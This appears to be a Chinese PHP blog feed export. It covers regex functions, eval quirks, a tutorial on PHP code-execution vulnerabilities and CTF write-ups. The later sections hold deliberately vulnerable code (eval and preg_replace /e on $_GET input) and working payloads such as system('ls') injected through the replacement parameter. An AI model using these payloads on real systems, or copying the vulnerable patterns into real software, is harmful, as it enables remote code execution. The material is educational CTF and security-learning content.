class="headerlink" title="使用 preg_match()"></a><strong>使用 preg_match()</strong></h4><p><code>preg_match()</code> 函数会告诉你一个字符串是否包含一个模式的匹配项。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$str</span> = <span class="hljs-string">&quot;Visit W3Schools&quot;</span>;<br><span class="hljs-variable">$pattern</span> = <span class="hljs-string">&quot;/w3schools/i&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-variable">$pattern</span>, <span class="hljs-variable">$str</span>); <span class="hljs-comment">// Outputs 1</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h4 id="使用-preg-match-all"><a href="#使用-preg-match-all" class="headerlink" title="使用 preg_match_all()"></a><strong>使用 preg_match_all()</strong></h4><p><code>preg_match_all()</code> 函数将告诉您在字符串中找到了多少匹配模式。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$str</span> = <span class="hljs-string">&quot;The rain in SPAIN falls mainly on the plains.&quot;</span>;<br><span class="hljs-variable">$pattern</span> = <span class="hljs-string">&quot;/ain/i&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">preg_match_all</span>(<span class="hljs-variable">$pattern</span>, <span class="hljs-variable">$str</span>); <span class="hljs-comment">// Outputs 4</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h4 id="使用-preg-replace"><a href="#使用-preg-replace" class="headerlink" title="使用 preg_replace()"></a><strong>使用 preg_replace()</strong></h4><p>在字符串中使用不区分大小写的正则表达式将 Microsoft 替换为 W3Schools：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$str</span> = <span class="hljs-string">&quot;Visit Microsoft!&quot;</span>;<br><span class="hljs-variable">$pattern</span> = <span class="hljs-string">&quot;/microsoft/i&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-variable">$pattern</span>, <span class="hljs-string">&quot;W3Schools&quot;</span>, <span class="hljs-variable">$str</span>); <span class="hljs-comment">// Outputs &quot;Visit W3Schools!&quot;</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h2 id="正则表达式修饰符"><a href="#正则表达式修饰符" class="headerlink" title="正则表达式修饰符"></a><strong>正则表达式修饰符</strong></h2><p>修饰符可以改变搜索的执行方式。</p><table><thead><tr><th>修饰符</th><th>描述</th></tr></thead><tbody><tr><td>i</td><td>不区分大小写</td></tr><tr><td>m</td><td>将字符串通过分隔符进行分割，将字符串中的每一行分别进行匹配。</td></tr><tr><td>u</td><td>启用 UTF-8 编码模式的正确匹配</td></tr><tr><td>e</td><td>将匹配出来的内容做一些php语法上的处理。</td></tr><tr><td>s</td><td>修正 “.” 的换行。</td></tr><tr><td>U</td><td>取消贪婪模式。</td></tr><tr><td>A</td><td>必须以这个模式开头。</td></tr><tr><td>D</td><td>修正 “$” 对 “\n” 的忽略。</td></tr><tr><td>x</td><td>忽略模式中的空白符。</td></tr></tbody></table><h2 id="通用原子"><a href="#通用原子" class="headerlink" title="通用原子"></a>通用原子</h2><p>括号用于查找字符范围</p><table><thead><tr><th>表达式</th><th>描述</th></tr></thead><tbody><tr><td>\d</td><td>数字</td></tr><tr><td>\D</td><td>除了数字</td></tr><tr><td>\w</td><td>数字，字母，下划线</td></tr><tr><td>\W</td><td>除了数字，字母，下划线</td></tr><tr><td>\s</td><td>空白符</td></tr><tr><td>\S</td><td>除了空白符</td></tr></tbody></table><h2 id="元字符"><a href="#元字符" class="headerlink" title="元字符"></a>元字符</h2><p>元字符时具有特殊含义的字符</p><table><thead><tr><th>元字符</th><th>描述</th></tr></thead><tbody><tr><td>|</td><td>或者</td></tr><tr><td>.</td><td>除了换行以外的所有字符</td></tr><tr><td>^</td><td>找到一个匹配作为字符串的开头，如：^Hello</td></tr><tr><td>$</td><td>在字符串末尾找到匹配项，如：World$</td></tr><tr><td>*</td><td>匹配前面的内容出现 0 次及以上</td></tr><tr><td>[]</td><td>是一个集合，匹配中括号中的任意一个字符，如：[abc]即为匹配a或b或者c。</td></tr><tr><td>()</td><td>后项引用 或者是当做一个整体</td></tr><tr><td>[^]</td><td>取反</td></tr><tr><td>[-]</td><td>代表一个范围，如[0-9],匹配即为 0123456789</td></tr></tbody></table><h2 id="量词"><a href="#量词" class="headerlink" title="量词"></a>量词</h2><p>量词定义数量：<br>的字符串 的字符串 的字符串 序列的字符串</p><table><thead><tr><th>量词</th><th>描述</th></tr></thead><tbody><tr><td>n+</td><td>匹配任何包含至少一个 <em>n</em></td></tr><tr><td>n*</td><td>匹配任何包含零次或多次 <em>n</em></td></tr><tr><td>n?</td><td>匹配任何包含 0 个或 1 个 <em>n</em></td></tr><tr><td>n{x}</td><td>匹配任何包含 <em>X</em> <em>n</em>‘s</td></tr><tr><td>n{x,y}</td><td>匹配任何包含 X 到 Y <em>n</em> 的序列的字符串</td></tr><tr><td>n{x,}</td><td>匹配任何包含至少 X 个 <em>n</em> 的序列的字符串</td></tr></tbody></table><p><strong>注释：</strong> 如果您的表达式需要搜索其中一个特殊字符，您可以使用反斜杠 () 对其进行转义。 例如，要搜索一个或多个问号，您可以使用以下表达式：$pattern &#x3D; ‘&#x2F;?+&#x2F;‘;</p><h2 id="后项引用"><a href="#后项引用" class="headerlink" title="后项引用"></a>后项引用</h2><p><img src="/img/%E6%AD%A3%E5%88%99%E5%8C%B9%E9%85%8D1.png" srcset="/img/loading.gif" lazyload></p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs livescript">如果想只去除掉b标签，只保留里面的字符串，这里就需要用到后项引用。怎么样后项引用呢，就是将 .* 括起来，<br>然后在匹配的时候，写上 <span class="hljs-string">\1</span> ,<span class="hljs-string">\1</span> 代表第一个括号里面匹配到的内容，当然为了防止 <span class="hljs-string">\</span> 将 <span class="hljs-number">1</span> 转义掉，所以我们使用 <span class="hljs-string">\\1</span> .<br><br></code></pre></td></tr></table></figure><h2 id="贪婪模式"><a href="#贪婪模式" class="headerlink" title="贪婪模式"></a>贪婪模式</h2><p><img src="/img/%E6%AD%A3%E5%88%99%E5%8C%B9%E9%85%8D.png" srcset="/img/loading.gif" lazyload></p><p>我们这是想匹配到每一个 b 标签，即abc 和 bcd,</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">//</span>如果使用下面的正则来匹配的话，会匹配出&lt;b&gt;abc&lt;<span class="hljs-regexp">/b&gt;&lt;b&gt;bcd&lt;/</span>b&gt;.<br><span class="hljs-variable">$pattern</span> = <span class="hljs-string">&#x27;/&lt;b&gt;.*&lt;\/b&gt;/&#x27;</span>;<br><br>所以此处我们要使用 .*?来取消贪婪，?代表匹配前面的内容 <span class="hljs-number">0</span> 次或者 <span class="hljs-number">1</span>次。<br><br><span class="hljs-regexp">//</span>正则表达式改为<br><span class="hljs-variable">$pattern</span> = <span class="hljs-string">&#x27;/&lt;b&gt;.*?&lt;/b&gt;/&#x27;</span>;<br><br><span class="hljs-regexp">//</span>当然取消贪婪还有一种写法：就是在后面加上一个 U ，即：<br><span class="hljs-variable">$pattern</span> = <span class="hljs-string">&#x27;/&lt;b&gt;.*&lt;/b&gt;/U&#x27;</span>;<br><br>但是切记不能 .*? 和 U 一起用。<br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>php</category>
      
    </categories>
    
    
    <tags>
      
      <tag>php</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>eval(踩坑)</title>
    <link href="/2023/05/29/%E4%B8%8D%E8%83%BD%E4%BB%A5%E5%8F%98%E9%87%8F%E5%87%BD%E6%95%B0%E7%9A%84%E5%BD%A2%E5%BC%8F%E8%B0%83%E7%94%A8eval/"/>
    <url>/2023/05/29/%E4%B8%8D%E8%83%BD%E4%BB%A5%E5%8F%98%E9%87%8F%E5%87%BD%E6%95%B0%E7%9A%84%E5%BD%A2%E5%BC%8F%E8%B0%83%E7%94%A8eval/</url>
    
    <content type="html"><![CDATA[<h3 id="不能以变量的形式引用eval等函数"><a href="#不能以变量的形式引用eval等函数" class="headerlink" title="不能以变量的形式引用eval等函数"></a>不能以变量的形式引用eval等函数</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">// 为什么这段代码可以运行</span><br><span class="hljs-comment">// 正常输出：howdy~</span><br><span class="hljs-variable">$foo</span> = <span class="hljs-string">&quot;system&quot;</span>;<br><span class="hljs-variable">$bar</span> = <span class="hljs-string">&quot;echo howdy~&quot;</span>;<br><span class="hljs-variable">$foo</span>(<span class="hljs-variable">$bar</span>);<br><br><span class="hljs-comment">// 而这段代码却不能运行</span><br><span class="hljs-comment">// PHP错误是：``PHP Fatal error:  Call to undefined function eval() in - on line ?``</span><br><span class="hljs-variable">$foo</span> = <span class="hljs-string">&quot;eval&quot;</span>;<br><span class="hljs-variable">$bar</span> = <span class="hljs-string">&quot;echo howdy~&quot;</span>;<br><span class="hljs-variable">$foo</span>(<span class="hljs-variable">$bar</span>);<br></code></pre></td></tr></table></figure><p>首先PHP支持”变量函数（variable-functions）”：通过变量保存一个函数的名字，然后在其后附上一对小括号的形式即可完成对函数的调用。但是为什么当调用对象为”eval”的时候就不行了呢？</p><p>参考PHP官方文档可知：eval 属于PHP语法构造的一部分，并不是一个函数，所以不能通过 变量函数 的形式来调用（虽然她确实像极了函数原型）。这样的语法构造还包括：echo，print，unset()，isset()，empty()，include，require，…</p><h3 id="eval和assert"><a href="#eval和assert" class="headerlink" title="eval和assert"></a><strong>eval和assert</strong></h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span>=<span class="hljs-keyword">eval</span>;<br><span class="hljs-variable">$a</span>(<span class="hljs-title function_ invoke__">phpinfo</span>());<br><br><span class="hljs-variable">$b</span>=assert;<br><span class="hljs-variable">$b</span>(<span class="hljs-title function_ invoke__">phpinfo</span>());<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><strong>注意双引号的使用：</strong>如果没有赋值操作可以不需要双引号。 比如： $a&#x3D;11; eval（”echo$a;”); 由于a已经赋值过，所以在函数内是不需要赋值的也就可以不需要使用来转义$. 相当于：eval（”echo$a;”); 注意在命令式字符串（包括分号）两边必须要有双引号或者根据需要用单引号。</p><p>上面这两个命令谁对谁错呢</p><p>首先eval肯定不能成功，而assert看情况，在php7.1之后的版本中也不能使用</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs scss"><span class="hljs-built_in">assert</span>()默认不在可以执行代码<br>这就是众多马不能用的罪魁祸首了，太多的马用<span class="hljs-built_in">assert</span>()来执行代码了，这个更新基本就团灭，一般情况下修改成eval即可正常运行了~<br></code></pre></td></tr></table></figure><p>小疑问（问题先丢在这吧）</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">eval</span>(<span class="hljs-string">&quot;phpinfo()&quot;</span>);<br><span class="hljs-keyword">eval</span>(<span class="hljs-string">&quot;phpinfo();&quot;</span>);<br><span class="hljs-keyword">eval</span>(<span class="hljs-title function_ invoke__">phpinfo</span>());<br></code></pre></td></tr></table></figure><p>只有第一个执行不了，这是为什么啊</p>]]></content>
    
    
    <categories>
      
      <category>php</category>
      
    </categories>
    
    
    <tags>
      
      <tag>php</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>代码执行漏洞</title>
    <link href="/2023/05/29/%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"/>
    <url>/2023/05/29/%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/</url>
    
    <content type="html"><![CDATA[<h3 id="代码执行漏洞描述"><a href="#代码执行漏洞描述" class="headerlink" title="代码执行漏洞描述"></a><strong>代码执行漏洞描述</strong></h3><p>当应用在调用一些字符串转化为代码的函数时，没有考虑用户是否能控制这个字符串，将造成代码注入漏洞(代码执行漏洞)。</p><h3 id="代码执行常见函数"><a href="#代码执行常见函数" class="headerlink" title="代码执行常见函数"></a><strong>代码执行常见函数</strong></h3><p>PHP：eval()、assert()、preg_replace()<br>python：eval<br>Java：没有类似于前面两者的函数，但是有反射机制，并且有基于反射机制的表达式引擎，如：0GNL、SpEL、MVEL 等</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span>=<span class="hljs-string">&#x27;phpinfo();&#x27;</span>;<br><span class="hljs-keyword">eval</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>eval可以执行代码phpinfo();，当然assert()也可以替代eval()。</p><h3 id="代码执行漏洞执行例子"><a href="#代码执行漏洞执行例子" class="headerlink" title="代码执行漏洞执行例子"></a>代码执行漏洞执行例子</h3><h4 id="动态代码执行漏洞"><a href="#动态代码执行漏洞" class="headerlink" title="动态代码执行漏洞"></a>动态代码执行漏洞</h4><p>动态代码执行漏洞，在程序开发过程中，需要用动态调用函数，如果参数可控的情况下，会造成代码执行漏洞。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">m_print</span>(<span class="hljs-params"></span>)</span>&#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;这是一个页面&#x27;</span>;<br>&#125;<br><span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>](<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;b&#x27;</span>]);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>查看php信息assert可以执行php里面的一些函数比如phpinfo()</p><h4 id="eval代码执行漏洞"><a href="#eval代码执行漏洞" class="headerlink" title="eval代码执行漏洞"></a><strong>eval代码执行漏洞</strong></h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$data</span> = <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;data&#x27;</span>])?<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;data&#x27;</span>]:<span class="hljs-string">&#x27;这是一个 eval 漏洞页面&#x27;</span>;<br>@<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$ret</span> = <span class="hljs-variable">$data</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$ret</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>假如不输入任何东西，则会输出   这是一个 eval 漏洞页面<br>假若输入xxxx  则会输出 xxxxx<br>假如输入phpinfo()相应的代码则会被执行</p><h4 id="preg-replace正则代码执行漏洞"><a href="#preg-replace正则代码执行漏洞" class="headerlink" title="preg_replace正则代码执行漏洞"></a><strong>preg_replace正则代码执行漏洞</strong></h4><p>preg_replace </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">mixed</span> <span class="hljs-title function_ invoke__">preg_replace</span> ( <span class="hljs-keyword">mixed</span> <span class="hljs-variable">$pattern</span> , <span class="hljs-keyword">mixed</span> <span class="hljs-variable">$replacement</span> , <span class="hljs-keyword">mixed</span> <span class="hljs-variable">$subject</span> [, <span class="hljs-keyword">int</span> <span class="hljs-variable">$limit</span> = -<span class="hljs-number">1</span> [, <span class="hljs-keyword">int</span> &amp;<span class="hljs-variable">$count</span> ]] )<br></code></pre></td></tr></table></figure><p>搜索 subject 中匹配 pattern 的部分， 以 replacement 进行替换。<br>参数说明</p><p>$pattern: 要搜索的模式，可以是字符串或一个字符串数组。<br>$replacement: 用于替换的字符串或字符串数组。<br>$subject: 要搜索替换的目标字符串或字符串数组。<br>$limit: 可选，对于每个模式用于每个 subject 字符串的最大可替换次数。 默认是-1（无限制）。<br>$count: 可选，为替换执行的次数。</p><p>返回值<br>如果 subject 是一个数组， preg_replace() 返回一个数组， 其他情况下返回一个字符串。<br>如果匹配被查找到，替换后的 subject 被返回，其他情况下返回没有改变的 subject。如果发生错误，返回 NULL。</p><h5 id="preg-replace-函数还有一个-x2F-e模式。可以导致代码执行。"><a href="#preg-replace-函数还有一个-x2F-e模式。可以导致代码执行。" class="headerlink" title="preg_replace() 函数还有一个&#x2F;e模式。可以导致代码执行。"></a>preg_replace() 函数还有一个&#x2F;e模式。可以导致代码执行。</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">complex</span>(<span class="hljs-params"><span class="hljs-variable">$re</span>, <span class="hljs-variable">$str</span></span>) </span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">preg_replace</span>(<br>        <span class="hljs-string">&#x27;/(&#x27;</span> . <span class="hljs-variable">$re</span> . <span class="hljs-string">&#x27;)/ei&#x27;</span>,<br>        <span class="hljs-string">&#x27;strtolower(&quot;\\1&quot;)&#x27;</span>,<br>        <span class="hljs-variable">$str</span><br>    );<br>&#125;<br><br></code></pre></td></tr></table></figure><p>上边的代码就是使用了preg_replace使用了&#x2F;e模式，导致可以代码执行。而且该函数的第一个和第三个参数我们是可以控制的。preg_replace 函数在匹配到符号正则的字符串时，会将替换字符串（第二个参数）当做代码来执行，但是这里的第二个参数却固定为 ‘strtolower(“\1”)’ 字符串。上面的命令执行，相当于 eval(‘strtolower(“\1”);’) 结果，当中的 \1 实际上就是 \1 ，而 \1 在正则表达式中有自己的含义</p><p><strong>反向引用</strong><br>对一个正则表达式模式或部分模式 两边添加圆括号 将导致相关 匹配存储到一个临时缓冲区 中，所捕获的每个子匹配都按照在正则表达式模式中从左到右出现的顺序存储。缓冲区编号从 1 开始，最多可存储 99 个捕获的子表达式。每个缓冲区都可以使用 ‘\n’ 访问，其中 n 为一个标识特定缓冲区的一位或两位十进制数。</p><p>说人话就是，\谁，就匹配第几个</p><p>我们拿 ripstech 官方给的 payload 进行分析，方便大家理解。官方 payload 为： <code>/?.*=&#123;$&#123;phpinfo()&#125;&#125;</code> ，即 GET 方式传入的参数名为 &#x2F;?.* ，值为 <code>&#123;$&#123;phpinfo()&#125;&#125;</code> </p><p><strong>案例</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?</span> <br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&quot;/test/e&quot;</span>,<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;h&quot;</span>],<span class="hljs-string">&quot;jutst test&quot;</span>); <br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><p>如果我们提交?h&#x3D;phpinfo()，phpinfo()将会被执行（使用&#x2F;e修饰符，preg_replace会将 replacement 参数当作 PHP 代码执行）。 </p><p>那如果这样呢</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">test</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>)</span><br><span class="hljs-function"></span>&#123;&#125;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&quot;/s*[php](.+?)[/php]s*/ies&quot;</span>, <span class="hljs-string">&#x27;test(&quot;\1&quot;)&#x27;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;h&quot;</span>]);<br><span class="hljs-meta">?&gt;</span> <br><br></code></pre></td></tr></table></figure><p>提交 ?h&#x3D;[php]phpinfo()[&#x2F;php]，phpinfo()会被执行吗？<br>肯定不会。因为经过正则匹配后， replacement 参数变为’test(“phpinfo”)’，此时phpinfo仅是被当做一个字符串参数了。<br>有没有办法让它执行呢？</p><p>在这里我们如果提交?h&#x3D;[php]{${phpinfo()}}[&#x2F;php]，phpinfo()就会被执行。为什么呢？<br>在php中，双引号里面如果包含有变量，php解释器会将其替换为变量解释后的结果；单引号中的变量不会被处理。<br>注意：双引号中的函数不会被执行和替换。<br>那这有没有办法防御呢？</p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmake">将&#x27;<span class="hljs-keyword">test</span>(<span class="hljs-string">&quot;\1&quot;</span>)&#x27; 修改为<span class="hljs-string">&quot;test(&#x27;\1&#x27;)&quot;</span>，这样‘<span class="hljs-variable">$&#123;phpinfo()&#125;</span>&#x27;就会被当做一个普通的字符串处理（单引号中的变量不会被处理）。<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>web</category>
      
      <category>常见Web漏洞</category>
      
    </categories>
    
    
    <tags>
      
      <tag>代码执行漏洞</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>综合</title>
    <link href="/2023/05/29/%E7%BB%BC%E5%90%88/"/>
    <url>/2023/05/29/%E7%BB%BC%E5%90%88/</url>
    
    <content type="html"><![CDATA[<h2 id="ics-5"><a href="#ics-5" class="headerlink" title="ics-5"></a>ics-5</h2><p>这个题目一开始进去瞎点没有什么思路，发现只有云平台设备维修中心可以点一点，可以发现url在变换，我们于是尝试一下文件包含漏洞</p><h3 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h3><p><img src="/img/%E7%BB%BC%E5%90%881.png" srcset="/img/loading.gif" lazyload><br>由此可以判断有文件包含漏洞“</p><p>接下来我们尝试读取源码使用php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;index.php<br><img src="/img/%E7%BB%BC%E5%90%882.png" srcset="/img/loading.gif" lazyload><br>这里是base64编码的我们对其解码</p><h3 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span> (<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>] === <span class="hljs-string">&#x27;127.0.0.1&#x27;</span>) &#123;<br><br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br &gt;Welcome My Admin ! &lt;br &gt;&quot;</span>;<br><br>    <span class="hljs-variable">$pattern</span> = <span class="hljs-variable">$_GET</span>[pat];<br>    <span class="hljs-variable">$replacement</span> = <span class="hljs-variable">$_GET</span>[rep];<br>    <span class="hljs-variable">$subject</span> = <span class="hljs-variable">$_GET</span>[sub];<br><br>    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$pattern</span>) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$replacement</span>) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$subject</span>)) &#123;<br>        <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-variable">$pattern</span>, <span class="hljs-variable">$replacement</span>, <span class="hljs-variable">$subject</span>);<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">die</span>();<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>这里我们开始进行简单的代码审计，可以发现这里会对我们的源IP进行检验如果是127.0.0.1就会输出对应的内容，接下来我们进行尝试<br><img src="/img/%E7%BB%BC%E5%90%883.png" srcset="/img/loading.gif" lazyload><br>查看下面的代码发现preg_replace函数</p><h4 id="preg-replace代码执行漏洞（-x2F-e）"><a href="#preg-replace代码执行漏洞（-x2F-e）" class="headerlink" title="preg_replace代码执行漏洞（&#x2F;e）"></a>preg_replace代码执行漏洞（&#x2F;e）</h4><p>这里有GET型传参，三个变量为pat,rep,sub<br>pat(pattern)：要搜索的模式，可以是字符串或一个字符串数组<br>rep(replacement):用于替换的字符串或者字符串数字<br>sub(subject):要搜索的替换的目标字符串或字符串数组</p><p>这里使用命令<br>pat&#x3D;&#x2F;abc&#x2F;e&amp;rep&#x3D;system(‘ls’)&amp;sub&#x3D;abcde<br><img src="/img/%E7%BB%BC%E5%90%884.png" srcset="/img/loading.gif" lazyload><br>可以查看当前目录<br>继续构造payload<br>pat&#x3D;&#x2F;abc&#x2F;e&amp;rep&#x3D;system(‘cd s3chahahaDir&amp;&amp;ls’)&amp;sub&#x3D;abcde<br>url编码后<br>pat&#x3D;&#x2F;abc&#x2F;e&amp;rep&#x3D;system(‘cd%20s3chahahaDir%26%26ls’)&amp;sub&#x3D;abcde<br>存在flag</p><h2 id="mfw"><a href="#mfw" class="headerlink" title="mfw"></a>mfw</h2><p>通过点击各个页面可以发现一点蛛丝马迹，文中说到使用git，这里就应该想到使用git源码泄露</p><h3 id="githacker"><a href="#githacker" class="headerlink" title="githacker"></a>githacker</h3><p>在kali里面进行安装<br>可以探测git源码是否泄露<br> python3 githacker.py –url <a href="http://111.200.241.244:56610/">http://111.200.241.244:56610/</a> –folder result</p><p>可以发现下载的index.php文件<br>打开可以发现源码</p><h3 id="代码审计-1"><a href="#代码审计-1" class="headerlink" title="代码审计"></a>代码审计</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;page&#x27;</span>])) &#123;<br>        <span class="hljs-variable">$page</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;page&#x27;</span>];<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-variable">$page</span> = <span class="hljs-string">&quot;home&quot;</span>;<br>&#125;<br><br><span class="hljs-variable">$file</span> = <span class="hljs-string">&quot;templates/&quot;</span> . <span class="hljs-variable">$page</span> . <span class="hljs-string">&quot;.php&quot;</span>;<br><br><span class="hljs-comment">// I heard &#x27;..&#x27; is dangerous!</span><br><span class="hljs-title function_ invoke__">assert</span>(<span class="hljs-string">&quot;strpos(&#x27;<span class="hljs-subst">$file</span>&#x27;, &#x27;..&#x27;) === false&quot;</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Detected hacking 